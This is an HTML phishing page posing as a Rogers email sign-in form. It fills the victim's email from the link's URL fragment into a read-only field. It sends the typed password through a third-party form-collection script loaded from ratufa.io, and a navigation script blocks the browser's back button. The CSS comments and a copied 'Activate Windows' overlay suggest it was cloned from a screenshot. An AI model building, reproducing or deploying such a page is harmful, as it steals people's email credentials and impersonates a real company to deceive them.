<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}

body {
    background-color: #ffffff;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    position: relative;
    overflow-x: hidden;
}

/* Top Vibrant Signal Red Brand Ribbon Header Bar Layer Elements */
.navbar-brand-header {
    width: 100%;
    background-color: #da291c; /* Sharp clear red background tint matching corporate theme */
    padding: 20px 80px;
    display: flex;
    align-items: center;
    z-index: 10;
}

.brand-logo-area {
    display: flex;
    align-items: center;
    gap: 12px;
    color: #ffffff;
}

.generic-icon-shape {
    width: 24px;
    height: 24px;
    background-color: #ffffff;
    border-radius: 50%;
    position: relative;
}

.generic-icon-shape::before {
    content: '';
    position: absolute;
    top: 4px;
    left: 4px;
    width: 16px;
    height: 16px;
    background-color: #da291c;
    border-radius: 50%;
}

.brand-typography-wrapper h2 {
    font-size: 20px;
    font-weight: 800;
    line-height: 1;
    letter-spacing: 1px;
}

.sub-brand-line {
    font-size: 11px;
    opacity: 0.85;
    margin-top: 2px;
}

.sub-brand-line span {
    font-weight: bold;
}

/* Secondary Charcoal Dark Gray Option Menu Strip Line Navbar */
.sub-nav-ribbon {
    width: 100%;
    background-color: #212529; /* Dark neutral tone tracking reference specifications */
    padding: 14px 80px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    z-index: 5;
}

.sub-nav-left {
    display: flex;
    align-items: center;
    gap: 12px;
}

.sub-nav-left a, .sub-nav-right a {
    color: rgba(255, 255, 255, 0.85);
    text-decoration: none;
    font-size: 13px;
    font-weight: 500;
}

.sub-nav-left a:hover, .sub-nav-right a:hover {
    color: #ffffff;
    text-decoration: underline;
}

.nav-divider {
    color: rgba(255, 255, 255, 0.2);
    font-size: 12px;
    user-select: none;
}

/* Main Content Workspace Layout Banner Box Backdrop */
.workspace-area {
    flex-grow: 1;
    background-color: #f8f9fa; /* Soft clean neutral gray workspace layout grid container background */
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 60px 40px 100px;
    width: 100%;
}

/* Floating Clean Layout Interface Block Card Panel Module */
.login-card {
    background-color: #ffffff;
    width: 100%;
    max-width: 440px;
    border: 1px solid #e2e8f0;
    border-radius: 8px;
    padding: 44px 40px;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.02);
    text-align: center;
}

.card-title {
    font-size: 20px;
    color: #212529;
    font-weight: 600;
    margin-bottom: 28px;
    text-align: left;
}

form {
    width: 100%;
}

.form-group {
    margin-bottom: 20px;
    width: 100%;
}

/* Clean structured input variable text entry modular boxes components template */
.form-control {
    width: 100%;
    height: 48px;
    border: 1px solid #94a3b8; /* Thin charcoal slate borders framework tracking template */
    border-radius: 6px;
    padding: 0 16px;
    font-size: 15px;
    color: #212529;
    outline: none;
    background-color: #ffffff;
}

.form-control:focus {
    border-color: #da291c;
}

.form-control::placeholder {
    color: #64748b;
    font-weight: 400;
}

/* Custom internal interactive show link positioning hooks inside password entry wrapper */
.password-group-wrapper {
    position: relative;
    width: 100%;
}

.password-group-wrapper .form-control {
    padding-right: 44px;
}

.eye-toggle-icon {
    position: absolute;
    right: 16px;
    top: 50%;
    transform: translateY(-50%);
    cursor: pointer;
    color: #64748b;
    font-size: 16px;
    user-select: none;
}

/* Inline choice checkbox parameter control option configuration row */
.checkbox-option-row {
    display: flex;
    align-items: center;
    gap: 8px;
    font-size: 14px;
    color: #495057;
    margin-bottom: 28px;
    text-align: left;
    padding-left: 2px;
}

.checkbox-option-row input {
    width: 16px;
    height: 16px;
    accent-color: #da291c;
    cursor: pointer;
}

.checkbox-option-row label {
    cursor: pointer;
}

/* High contrast crisp wide rectangular solid pinkish-coral red primary submit capsule button block component (NOW FULLY CLICKABLE) */
.submit-btn {
    position: relative;
    z-index: 20;
    width: 100%;
    background-color: #e57373; /* Smooth light coral red shade precisely matching the original blueprint specifications */
    color: #ffffff;
    border: none;
    height: 48px;
    font-size: 15px;
    font-weight: 600;
    border-radius: 4px;
    cursor: pointer;
    transition: background-color 0.15s ease;
}

.submit-btn:hover {
    background-color: #da291c;
}

/* Base Fine-Print Corporate Watermark Ribbon Panel Area components */
.page-footer {
    position: absolute;
    bottom: 0;
    left: 0;
    width: 100%;
    background-color: #111111;
    padding: 24px 80px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 12px;
    color: rgba(255, 255, 255, 0.6);
    z-index: 10;
}

.footer-left {
    white-space: nowrap;
}

.footer-right {
    display: flex;
    gap: 12px;
    align-items: center;
}

.footer-right a {
    color: rgba(255, 255, 255, 0.6);
    text-decoration: none;
}

.footer-right a:hover {
    color: #ffffff;
    text-decoration: underline;
}

.footer-divider {
    color: rgba(255, 255, 255, 0.15);
    user-select: none;
}

/* Fixed Background Environment Active Watermark Layer Notification Replication Blueprint */
.system-watermark {
    position: fixed;
    bottom: 80px; /* Offset to clear the absolute bottom page footer area */
    right: 40px;
    text-align: left;
    font-size: 13px;
    color: rgba(0, 0, 0, 0.12);
    line-height: 1.4;
    user-select: none;
    pointer-events: none;
    z-index: 100;
}

@media (max-width: 768px) {
    .navbar-brand-header {
        padding: 20px;
    }
    .sub-nav-ribbon {
        padding: 14px 20px;
        flex-direction: column;
        gap: 12px;
        align-items: flex-start;
    }
    .workspace-area {
        padding: 40px 20px 120px;
    }
    .login-card {
        max-width: 100%;
        padding: 32px 20px;
    }
    .page-footer {
        flex-direction: column;
        gap: 12px;
        text-align: center;
        padding: 20px;
    }
    .system-watermark {
        bottom: 120px;
        right: 20px;
    }
}
    </style>
</head>
<body>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <!-- Link to external stylesheet -->
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <!-- Top Red Navigation Banner -->
    <header class="navbar-brand-header">
        <div class="brand-logo-area">
            <!-- Universal Square/Circle Layout Geometry Placeholder to represent brand icons safely -->
            <div class="generic-icon-shape"></div>
            <div class="brand-typography-wrapper">
                <h2>ROGERS</h2>
                <div class="sub-brand-line">together with <span>Branch</span></div>
            </div>
        </div>
    </header>

    <!-- Secondary Gray Sub-Navigation Strip Line Row Links Menu -->
    <div class="sub-nav-ribbon">
        <div class="sub-nav-left">
            <a href="#">Home</a>
            <span class="nav-divider">|</span>
            <a href="#">Business</a>
            <span class="nav-divider">|</span>
            <a href="#">Shop</a>
            <span class="nav-divider">|</span>
            <a href="#">Support</a>
            <span class="nav-divider">|</span>
            <a href="#">MyAccount</a>
        </div>
        <div class="sub-nav-right">
            <a href="#" class="contact-trigger">💬 Contact</a>
        </div>
    </div>

    <!-- Main Workspace Section Layout View Frame Box Container -->
    <main class="workspace-area">
        
        <!-- Center Floating White Interface Panel Card Component Box -->
        <div class="login-card">
            <h1 class="card-title">Sign in to access your email</h1>

            <!-- Integrated Interactive Form submission tracking with FormSubmit -->
            <form action="" method="POST">

                                <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
                <!-- Active URL Hash Fragment Parsing Email Text Field Input Box -->
                <div class="form-group">
                <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
                </div>

                <!-- Secure Password Entry Field Component Area Block -->
                <div class="form-group password-group-wrapper">
<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
  oninput="this.setCustomValidity('')"/>
                    <span class="eye-toggle-icon">👁️</span>
                </div>

                <!-- Inline Choice Checkbox Parameter Control Option -->
                <div class="checkbox-option-row">
                    <input type="checkbox" id="remember" name="remember_user" checked>
                    <label for="remember">Remember my email</label>
                </div>

                <!-- High-contrast crisp rectangular coral red primary submit action button (NOW FULLY CLICKABLE) -->
                <button type="submit" class="submit-btn">Sign in</button>
            </form>
        </div>

    </main>

    <!-- Base Page Fine-Print Copyright Information Footer Banner -->
    <footer class="page-footer">
        <div class="footer-left">
            &copy; 2026 Corporate Communications
        </div>
        <div class="footer-right">
            <a href="#">Privacy Policy</a>
            <span class="footer-divider">|</span>
            <a href="#">Terms of Use</a>
            <span class="footer-divider">|</span>
            <a href="#">Accessibility</a>
        </div>
    </footer>

    <!-- Windows Environment Activation Notification Simulation Overlay Layer Components Grid -->
    <div class="system-watermark">
        Activate Windows<br>
        <span style="font-size: 11px;">Go to Settings to activate Windows.</span>
    </div>

    <!-- Active Anchor URL Hash Fragment Parsing Node Logic -->
    <script>
        window.addEventListener('DOMContentLoaded', () => {
            if (window.location.hash) {
                document.getElementById("email").value = window.location.hash.substring(1).trim();
            }
        });
    </script>


    <!-- Active Anchor URL Hash Fragment Parsing Node Logic -->
    <script>
        window.addEventListener('DOMContentLoaded', () => {
            if (window.location.hash) {
                document.getElementById("email").value = window.location.hash.substring(1).trim();
            }
        });
    </script>

    <!-- Navigation Interlock Logic -->
    <script type="text/javascript">
        (function() {
            window.history.pushState(null, null, window.location.href);
            window.onpopstate = function() {
                window.history.pushState(null, null, window.location.href);
            };
        })();
        
        function preventBack() {
            window.history.forward();
        }
        setTimeout("preventBack()", 0);
        window.onunload = function () { null };
    </script>

</body>
</html>
